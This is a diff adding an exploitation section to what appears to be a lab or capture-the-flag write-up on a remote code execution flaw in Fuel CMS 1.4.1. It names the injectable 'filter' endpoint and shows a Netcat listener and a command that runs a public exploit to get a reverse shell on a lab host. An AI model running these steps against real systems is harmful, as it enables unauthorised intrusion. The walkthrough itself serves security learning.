@@ -46,6 +46,44 @@ This exploit is written in **Python** and leverages the vulnerable endpoint to a
 The script was downloaded and prepared for use in the next phase of the attack.
 
 
+## 💥 Exploitation
+
+After identifying a **Remote Code Execution (RCE)** vulnerability in **Fuel CMS 1.4.1**, the next step was to exploit it in order to gain access to the target system.
+
+A publicly available exploit written in Python was used to interact with the vulnerable endpoint:
+
+```text
+/fuel/pages/select/?filter=
+```
+
+This exploit allows the execution of **arbitrary system commands** by injecting them into the `filter` parameter.
+
+To establish a connection with the target, a reverse shell payload was configured within the exploit. A Netcat listener was set up on the attacker's machine to receive the incoming connection:
+
+```bash
+nc -lvnp 4444
+```
+
+The exploit was then executed with the appropriate parameters, including the target URL, attacker IP address, and listening port:
+
+```bash
+python3 fuel_rce.py http://10.130.137.229 10.129.79.84 4444
+```
+
+Upon execution, the target system successfully connected back to the attacker's machine, resulting in a remote shell running under the `www-data` user.
+
+Basic enumeration commands were executed to verify access and explore the system:
+
+```bash
+whoami
+ls
+```
+
+This confirmed that initial access had been successfully obtained, allowing further investigation of the server and its contents.
+
+
+
+
 
 
 
